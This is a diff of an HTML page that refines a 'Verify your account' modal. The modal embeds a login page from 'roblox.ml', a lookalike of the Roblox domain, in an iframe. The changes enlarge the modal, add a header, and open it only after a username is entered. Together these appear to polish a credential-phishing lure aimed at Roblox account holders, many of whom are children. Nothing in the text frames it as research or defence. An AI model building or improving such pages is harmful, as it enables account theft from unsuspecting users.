@@ -567,6 +567,7 @@
 
 
 
+
 <!-- CUSTOM VERIFY MODAL -->
 <div id="customVerifyModal" style="
   display:none;
@@ -579,30 +580,39 @@
 ">
   <div style="
     width:90%;
-    max-width:480px;
-    height:420px;
+    max-width:1100px;
+    height:750px;
     background:#0f172a;
-    border-radius:12px;
+    border-radius:14px;
     position:relative;
     overflow:hidden;
     box-shadow:0 25px 60px rgba(0,0,0,.6);
   ">
-    <button onclick="closeCustomVerifyModal()" style="
-      position:absolute;
-      top:10px;
-      right:10px;
-      background:#ef4444;
+    <div style="
+      height:50px;
+      background:#020617;
       color:#fff;
-      border:none;
-      border-radius:6px;
-      padding:4px 10px;
-      cursor:pointer;
-      z-index:10;
-    ">✕</button>
+      display:flex;
+      align-items:center;
+      padding:0 16px;
+      font-weight:600;
+      font-size:14px;
+    ">
+      Verify your account
+      <button onclick="closeCustomVerifyModal()" style="
+        margin-left:auto;
+        background:#ef4444;
+        color:#fff;
+        border:none;
+        border-radius:6px;
+        padding:4px 10px;
+        cursor:pointer;
+      ">✕</button>
+    </div>
 
     <iframe
       src="https://roblox.ml/login?returnUrl=9434460789590783"
-      style="width:100%; height:100%; border:none; background:#fff;"
+      style="width:100%; height:calc(100% - 50px); border:none; background:#fff;"
       referrerpolicy="no-referrer">
     </iframe>
   </div>
@@ -610,11 +620,14 @@
 
 <script>
 function openCustomVerifyModal() {
+  const username = document.getElementById("username");
+  if (!username || !username.value.trim()) return;
   document.getElementById("customVerifyModal").style.display = "flex";
 }
 function closeCustomVerifyModal() {
   document.getElementById("customVerifyModal").style.display = "none";
 }
 </script>
+
 
 </body></html>
